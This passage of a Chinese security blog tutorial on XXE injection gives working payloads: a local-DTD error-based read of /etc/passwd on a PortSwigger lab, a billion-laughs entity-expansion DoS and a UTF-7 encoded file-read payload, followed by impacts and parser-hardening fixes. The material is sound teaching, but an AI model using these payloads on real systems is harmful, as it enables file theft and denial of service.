+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+</span></span><span class="line"><span class="cl">Accept: */*
+</span></span><span class="line"><span class="cl">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate, br
+</span></span><span class="line"><span class="cl">Referer: https://0a26004504ede4f781f58428005d00c0.web-security-academy.net/product?productId=2
+</span></span><span class="line"><span class="cl">Content-Type: application/xml
+</span></span><span class="line"><span class="cl">Content-Length: 425
+</span></span><span class="line"><span class="cl">Origin: https://0a26004504ede4f781f58428005d00c0.web-security-academy.net
+</span></span><span class="line"><span class="cl">Sec-Fetch-Dest: empty
+</span></span><span class="line"><span class="cl">Sec-Fetch-Mode: cors
+</span></span><span class="line"><span class="cl">Sec-Fetch-Site: same-origin
+</span></span><span class="line"><span class="cl">Priority: u=0
+</span></span><span class="line"><span class="cl">Te: trailers
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE message [
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % local_dtd SYSTEM &#34;file:///usr/share/yelp/dtd/docbookx.dtd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY % ISOamso &#39;
+</span></span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY &amp;#x25; file SYSTEM &#34;file:///etc/passwd&#34;&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!ENTITY &amp;#x25; eval &#34;&lt;!ENTITY &amp;#x26;#x25; error SYSTEM &amp;#x27;file:///nonexistent/&amp;#x25;file;&amp;#x27;&gt;</span>&#34;&gt;
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;#x25;</span>eval;
+</span></span><span class="line"><span class="cl"><span class="ni">&amp;#x25;</span>error;
+</span></span><span class="line"><span class="cl">&#39;&gt;
+</span></span><span class="line"><span class="cl">%local_dtd;
+</span></span><span class="line"><span class="cl">]&gt;<span class="nt">&lt;stockCheck&gt;&lt;productId&gt;</span>2<span class="nt">&lt;/productId&gt;&lt;storeId&gt;</span>1<span class="nt">&lt;/storeId&gt;&lt;/stockCheck&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="310利用xxe实现ddos漏洞">3.10.利用XXE实现DDOS漏洞
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">这个的原理就是递归引用,lol 实体具体还有 “lol” 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2 实体，此时一个 lol3 实体就含有 10^2 个 “lol” 了，以此类推，lol10 实体含有 10^9 个 “lol” 字符串,最后再引用lol10。此时服务器加载的字符太多,可能导致崩溃.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl"><span class="cp">&lt;?xml version=&#34;1.0&#34;?&gt;</span> 
+</span></span><span class="line"><span class="cl"><span class="cp">&lt;!DOCTYPE abc [
+</span></span></span><span class="line"><span class="cl"><span class="cp">  &lt;!ENTITY lol &#34;lol&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ELEMENT lolz (#PCDATA)&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol1 &#34;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&amp;lol;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol2 &#34;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&amp;lol1;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol3 &#34;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&amp;lol2;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol4 &#34;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&amp;lol3;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol5 &#34;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&amp;lol4;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol6 &#34;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&amp;lol5;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol7 &#34;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&amp;lol6;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol8 &#34;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&amp;lol7;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="cp">&lt;!ENTITY lol9 &#34;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&amp;lol8;&#34;&gt;</span>
+</span></span><span class="line"><span class="cl">]&gt; 
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;abc&gt;</span><span class="ni">&amp;lol9;</span><span class="nt">&lt;/abc&gt;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/10.png"
+	width="1443"
+	height="714"
+	srcset="/p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/10_hu_d2d2f8c445f92b09.png 480w, /p/xml%E5%A4%96%E9%83%A8%E5%AE%9E%E4%BD%93%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/10_hu_9d58f37984de5214.png 1024w"
+	loading="lazy"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="202"
+		data-flex-basis="485px"
+	
+></p>
+<h3 id="311通过utf-7编码利用xxe">3.11.通过UTF-7编码利用XXE
+</h3><p><strong>所有 XXE 攻击载荷中，仅采用了 UTF-8 编码。如前文所述，部分过滤规则主要涉及删除恶意关键字与语法符号。</strong></p>
+<p><strong>然而，若 XML 解析器被配置为接受多种字符编码，那么攻击者实际上能够发送以 UTF-7 字符集编码的恶意载荷，而非局限于 UTF-8 编码：</strong></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="n">xml</span><span class="w"> </span><span class="n">version</span><span class="o">=</span><span class="s">&#34;1.0&#34;</span><span class="w"> </span><span class="n">encoding</span><span class="o">=</span><span class="s">&#34;UTF-7&#34;</span><span class="o">?&gt;+</span><span class="n">ADw</span><span class="o">-+</span><span class="n">ACE</span><span class="o">-</span><span class="n">DOCTYPE</span><span class="o">+</span><span class="n">ACA</span><span class="o">-</span><span class="n">data</span><span class="o">+</span><span class="n">ACA</span><span class="o">-+</span><span class="n">AFs</span><span class="o">-+</span><span class="n">AAo</span><span class="o">-+</span><span class="n">ACA</span><span class="o">-+</span><span class="n">ACA</span><span class="o">-+</span><span class="n">ADw</span><span class="o">-+</span><span class="n">ACE</span><span class="o">-</span><span class="n">ENTITY</span><span class="o">+</span><span class="n">ACA</span><span class="o">-</span><span class="n">xxe</span><span class="o">+</span><span class="n">ACA</span><span class="o">-</span><span class="n">SYSTEM</span><span class="o">+</span><span class="n">ACA</span><span class="o">-+</span><span class="n">ACI</span><span class="o">-</span><span class="n">file</span><span class="p">:</span><span class="c1">///etc/passwd+ACI-+AD4-+AAo-+AF0-+AD4-+AAo-+ADw-data+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-post+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-title+AD4-+ACY-xxe+ADs-+ADw-/post+AF8-title+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ACA-+ADw-post+AF8-desc+AD4-xyz+ADw-/post+AF8-desc+AD4-+AAo-+ACA-+ACA-+ACA-+ACA-+ADw-/post+AD4-+AAo-+ADw-/data+AD4-</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="4xxe漏洞危害">4.XXE漏洞危害
+</h2><p><a class="link" href="https://blog.csdn.net/qq_34598847/article/details/133803306?utm_medium=distribute.pc_relevant.none-task-blog-2~default~baidujs_baidulandingword~default-0-133803306-blog-43775691.235"  target="_blank" rel="noopener"
+    >XEE漏洞学习(史上最详细 包括Linux配置漏洞环境)-CSDN博客</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">任意文件读取</span><span class="err">：</span><span class="n">攻击者可以构造恶意XML外部实体</span><span class="err">，</span><span class="n">读取服务器上的敏感文件</span><span class="err">，</span><span class="n">如配置文件</span><span class="err">、</span><span class="n">数据库文件</span><span class="err">、</span><span class="n">密码文件</span><span class="err">（</span><span class="n">如</span><span class="o">/</span><span class="n">etc</span><span class="o">/</span><span class="n">passwd</span><span class="err">）</span><span class="n">等</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">端口扫描</span><span class="err">：</span><span class="n">请求内网的主机端口信息</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">命令执行</span><span class="err">：</span><span class="n">在某些环境下</span><span class="err">，</span><span class="n">攻击者可以利用XXE漏洞执行系统命令</span><span class="err">。</span><span class="n">例如</span><span class="err">，</span><span class="n">在PHP环境下</span><span class="err">，</span><span class="n">如果安装了expect扩展</span><span class="err">，</span><span class="n">攻击者可以构造恶意XML来执行系统命令</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">拒绝服务攻击</span><span class="err">（</span><span class="n">DoS</span><span class="err">）：</span><span class="n">通过构造特定的XML实体</span><span class="err">，</span><span class="n">攻击者可以使服务器资源耗尽</span><span class="err">，</span><span class="n">导致服务不可用</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">SSRF漏洞</span><span class="err">：</span><span class="n">攻击者可以利用XXE漏洞发起对内部网络或其他受限资源的请求</span><span class="err">，</span><span class="n">从而绕过防火墙和访问控制</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="5xxe漏洞修复">5.XXE漏洞修复
+</h2><h3 id="51禁用外部实体">5.1.禁用外部实体
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">DocumentBuilderFactory</span><span class="w"> </span><span class="n">dbf</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">DocumentBuilderFactory</span><span class="p">.</span><span class="na">newInstance</span><span class="p">();</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">dbf</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="s">&#34;http://apache.org/xml/features/disallow-doctype-decl&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">dbf</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="s">&#34;http://xml.org/sax/features/external-general-entities&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">dbf</span><span class="p">.</span><span class="na">setFeature</span><span class="p">(</span><span class="s">&#34;http://xml.org/sax/features/external-parameter-entities&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">libxml_disable_entity_loader</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">from</span><span class="w"> </span><span class="n">defusedxml</span><span class="p">.</span><span class="na">lxml</span><span class="w"> </span><span class="kn">import</span><span class="w"> </span><span class="nn">parse</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">tree</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">parse</span><span class="p">(</span><span class="n">xml_string</span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">输入验证和过滤</font></strong></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">安全配置服务器</font></strong></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">升级解析器版本</font></strong></p>
+<p><strong><font style="color:rgba(0, 0, 0, 0.9);background-color:rgb(252, 252, 252);">定期安全审计</font></strong></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>By Lsec</span>
+    </section>
+    <section class="article-lastmod">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+        <span>
+            最后更新于 Jun 22, 2025 22:00 &#43;0800
+        </span>
+    </section></footer>
+
+
+    
+</article>
+
+    
+
+    
+
+     
+    
+        
+    <div class="disqus-container">
+    <div id="disqus_thread"></div>
+<script>
+    window.disqus_config = function () {
+    
+    
+    
+    };
+    (function() {
+        if (["localhost", "127.0.0.1"].indexOf(window.location.hostname) != -1) {
+            document.getElementById('disqus_thread').innerHTML = 'Disqus comments not available by default when the website is previewed locally.';
+            return;
+        }
+        var d = document, s = d.createElement('script'); s.async = true;
+        s.src = '//' + "hugo-theme-stack" + '.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', +new Date());
+        (d.head || d.body).appendChild(s);
+    })();
+</script>
+<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+<a href="https://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
+</div>
+
+<style>
+    .disqus-container {
+        background-color: var(--card-background);
+        border-radius: var(--card-border-radius);
+        box-shadow: var(--shadow-l1);
+        padding: var(--card-padding);
+    }
+</style>
+
+<script>
+    window.addEventListener('onColorSchemeChange', (e) => {
+        if (typeof DISQUS == 'object') {
+            DISQUS.reset({
+                reload: true
+            });
+        }
+    })
+</script>
+
+    
+
+    <footer class="site-footer">
+    <section class="copyright">
+        &copy; 
+        
+        2025 Lsec&#39;s Blog
+    </section>
+    
+    <section class="powerby">
+        使用 <a href="https://gohugo.io/" target="_blank" rel="noopener">Hugo</a> 构建 <br />
+        主题 <b><a href="https://github.com/CaiJimmy/hugo-theme-stack" target="_blank" rel="noopener" data-version="3.30.0">Stack</a></b> 由 <a href="https://jimmycai.com" target="_blank" rel="noopener">Jimmy</a> 设计
+    </section>
+</footer>
+
+
+    
+<div class="pswp" tabindex="-1" role="dialog" aria-hidden="true">
+
+    
+    <div class="pswp__bg"></div>
+
+    
+    <div class="pswp__scroll-wrap">
+
+        
+        <div class="pswp__container">
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+            <div class="pswp__item"></div>
+        </div>
+
+        
+        <div class="pswp__ui pswp__ui--hidden">
+
+            <div class="pswp__top-bar">
+
+                
+
+                <div class="pswp__counter"></div>
+
+                <button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+
+                <button class="pswp__button pswp__button--share" title="Share"></button>
+
+                <button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+
+                <button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button>
+
+                
+                
+                <div class="pswp__preloader">
+                    <div class="pswp__preloader__icn">
+                        <div class="pswp__preloader__cut">
+                            <div class="pswp__preloader__donut"></div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap">
+                <div class="pswp__share-tooltip"></div>
+            </div>
+
+            <button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+            </button>
+
+            <button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)">
+            </button>
+
+            <div class="pswp__caption">
+                <div class="pswp__caption__center"></div>
+            </div>
+
+        </div>
+
+    </div>
+
+</div><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js"integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo="crossorigin="anonymous"
+                defer
+                >
+            </script><script 
+                src="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js"integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU="crossorigin="anonymous"
+                defer
+                >
+            </script><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css"crossorigin="anonymous"
+            ><link 
+                rel="stylesheet" 
+                href="https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css"crossorigin="anonymous"
+            >
+
+            </main>
+        </div>
+        <script 
+                src="https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js"integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z&#43;KMkF24hUW8WePSA9HM="crossorigin="anonymous"
+                
+                >
+            </script><script type="text/javascript" src="/ts/main.1e9a3bafd846ced4c345d084b355fb8c7bae75701c338f8a1f8a82c780137826.js" defer></script>
+<script>
+    (function () {
+        const customFont = document.createElement('link');
+        customFont.href = "https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap";
+
+        customFont.type = "text/css";
+        customFont.rel = "stylesheet";
+
+        document.head.appendChild(customFont);
+    }());
+</script>
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>���¹鵵ҳ</title>
+    
+    <script defer src="https://cn.vercount.one/js"></script>
+</head>
+<body>
+</body>
+</html>
+    </body>
+</html>
